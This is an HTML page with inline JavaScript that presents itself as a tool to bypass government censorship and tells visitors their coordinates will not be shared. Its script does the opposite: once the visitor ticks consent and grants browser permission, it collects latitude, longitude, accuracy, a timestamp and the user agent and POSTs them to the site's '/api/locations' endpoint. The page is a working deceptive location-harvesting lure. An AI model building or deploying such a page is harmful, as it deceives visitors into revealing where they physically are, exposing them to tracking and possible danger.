<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Share Location</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;

      background: url("Thank you For Participating Godspeed_page-0001.jpg") no-repeat center center fixed;
      background-size: cover;

      color: #fff;
      text-shadow: 0 1px 3px rgba(0,0,0,0.7);
    }

    .card {
      background: rgba(0,0,0,0.6);
      padding: 2rem;
      border-radius: 12px;
      max-width: 500px;
      width: 90%;
    }

    button {
      padding: 0.75rem 1rem;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      margin: 0.25rem;
    }

    .primary { background: #2563eb; color: white; }
    .ghost { background: rgba(255,255,255,0.7); color: #000; }

    #status { 
      margin-top: 1rem; 
      font-size: 0.9rem; 
    }

    .ok { color: #00ff88; }
    .err { color: #ff5555; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Hello!,Apa Khabar!</h1>
    <p>
      Please Click on share Location as this is a way to bypass Goverment Censorship
      <code>navigator.geolocation</code>
      Your coordinates will <strong>not</strong> be shared and is secured.
    </p>

    <label>
      <input type="checkbox" id="agree">
      Consent.
    </label>
    <br><br>

    <button id="share" class="primary">Share Location</button>
    <button id="skip" class="ghost">No Thanks</button>

    <p id="status"></p>
  </div>

  <script>
    const statusEl = document.getElementById('status');
    const shareBtn = document.getElementById('share');
    const skipBtn = document.getElementById('skip');

    function say(msg, cls = '') {
      statusEl.textContent = msg;
      statusEl.className = cls;
    }

    skipBtn.addEventListener('click', () => {
      say('No location shared.');
    });

    shareBtn.addEventListener('click', () => {
      const agreed = document.getElementById('agree').checked;
      if (!agreed) {
        say('Please tick the consent box first.', 'err');
        return;
      }

      if (!navigator.geolocation) {
        say('Geolocation not supported by your browser.', 'err');
        return;
      }

      say('Requesting your locationâ€¦');

      navigator.geolocation.getCurrentPosition(async pos => {
        const { latitude, longitude, accuracy } = pos.coords;
        const payload = {
          lat: latitude,
          lon: longitude,
          accuracy,
          at: new Date().toISOString(),
          ua: navigator.userAgent
        };

        try {
          const res = await fetch('/api/locations', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          if (!res.ok) throw new Error('Server error');
          say('Thanks You for participating,Godspeed Ego Vigilo.', 'ok');
        } catch (err) {
          console.error(err);
          say('Failed to send location.', 'err');
        }
      }, err => {
        if (err.code === err.PERMISSION_DENIED) {
          say('Permission denied. No location shared.');
        } else {
          say('Could not get location.', 'err');
        }
      });
    });
  </script>
</body>
</html>
